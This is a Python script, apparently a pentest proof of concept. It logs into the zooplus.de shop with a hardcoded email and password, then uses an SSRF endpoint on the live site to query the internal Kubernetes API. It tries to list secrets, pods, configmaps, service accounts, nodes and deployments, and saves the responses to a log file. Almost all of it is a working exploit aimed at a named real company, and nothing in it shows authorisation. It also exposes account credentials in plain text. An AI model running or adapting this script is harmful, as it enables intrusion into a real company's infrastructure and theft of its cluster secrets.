#!/usr/bin/env python3
"""Prove SSRF to Kubernetes API - Get real data"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
import os
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
})

os.makedirs("logs", exist_ok=True)
proof_file = f"logs/ssrf_proof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"
k8s_base = "https://kubernetes.default.svc"

proof_data = {
    "timestamp": datetime.now().isoformat(),
    "vulnerable_endpoint": f"{base}{ssrf_endpoint}",
    "tests": []
}

print("="*70)
print("PROOF OF CONCEPT: SSRF to Kubernetes API")
print("="*70)

# Test different endpoints
k8s_endpoints = [
    ("/api/v1/namespaces/default/pods", "List Pods"),
    ("/api/v1/namespaces/default/secrets", "List Secrets"),
    ("/api/v1/namespaces/default/configmaps", "List ConfigMaps"),
    ("/api/v1/namespaces", "List All Namespaces"),
    ("/api/v1/namespaces/default/serviceaccounts", "List Service Accounts"),
    ("/api/v1/nodes", "List Nodes"),
    ("/apis/apps/v1/namespaces/default/deployments", "List Deployments"),
    ("/api/v1/persistentvolumes", "List Persistent Volumes"),
]

for k8s_path, description in k8s_endpoints:
    print(f"\n[*] Testing: {description}")
    print(f"    Endpoint: {k8s_base}{k8s_path}")
    
    try:
        resp = s.post(f"{base}{ssrf_endpoint}", json={
            "url": f"{k8s_base}{k8s_path}"
        }, timeout=10, verify=False)
        
        print(f"    Status: {resp.status_code}")
        print(f"    Response length: {len(resp.text)}")
        
        test_result = {
            "description": description,
            "k8s_endpoint": f"{k8s_base}{k8s_path}",
            "status_code": resp.status_code,
            "response_length": len(resp.text),
            "response_preview": resp.text[:500],
            "headers": dict(resp.headers)
        }
        
        # Check if we got Kubernetes API response
        if resp.status_code in [200, 403]:
            if "items" in resp.text or "kind" in resp.text.lower() or "apiVersion" in resp.text.lower():
                print(f"    [CRITICAL] Kubernetes API response detected!", "SUCCESS")
                test_result["kubernetes_response"] = True
                
                # Try to parse JSON
                try:
                    data = json.loads(resp.text)
                    test_result["parsed_data"] = {
                        "kind": data.get("kind"),
                        "apiVersion": data.get("apiVersion"),
                        "items_count": len(data.get("items", [])) if isinstance(data.get("items"), list) else None
                    }
                    if data.get("items"):
                        test_result["sample_items"] = [item.get("metadata", {}).get("name") for item in data["items"][:5]]
                    print(f"    Kind: {data.get('kind')}")
                    print(f"    Items: {len(data.get('items', []))}")
                except:
                    test_result["parse_error"] = "Not valid JSON"
            elif resp.status_code == 403:
                print(f"    [INFO] 403 Forbidden - SSRF works but no permissions (RBAC)")
                test_result["rbac_blocked"] = True
            else:
                print(f"    Response: {resp.text[:200]}...")
        else:
            print(f"    Unexpected status: {resp.status_code}")
        
        proof_data["tests"].append(test_result)
        
    except Exception as e:
        print(f"    [ERROR] {e}")
        proof_data["tests"].append({
            "description": description,
            "k8s_endpoint": f"{k8s_base}{k8s_path}",
            "error": str(e)
        })

# Save proof
with open(proof_file, "w", encoding="utf-8") as f:
    json.dump(proof_data, f, indent=2, ensure_ascii=False)

print("\n" + "="*70)
print("RESULTS")
print("="*70)

# Summary
kubernetes_responses = [t for t in proof_data["tests"] if t.get("kubernetes_response")]
rbac_blocked = [t for t in proof_data["tests"] if t.get("rbac_blocked")]

print(f"\nKubernetes API responses detected: {len(kubernetes_responses)}")
print(f"RBAC blocked (403): {len(rbac_blocked)}")
print(f"\nProof saved to: {proof_file}")

if kubernetes_responses:
    print("\n[CRITICAL] SSRF to Kubernetes API CONFIRMED!")
    print("The following endpoints returned Kubernetes API responses:")
    for test in kubernetes_responses:
        print(f"  - {test['description']}: {test['k8s_endpoint']}")
        if test.get("parsed_data"):
            print(f"    Kind: {test['parsed_data'].get('kind')}")
            print(f"    Items: {test['parsed_data'].get('items_count')}")
            if test.get("sample_items"):
                print(f"    Sample: {', '.join(test['sample_items'][:3])}")

print("\n" + "="*70)





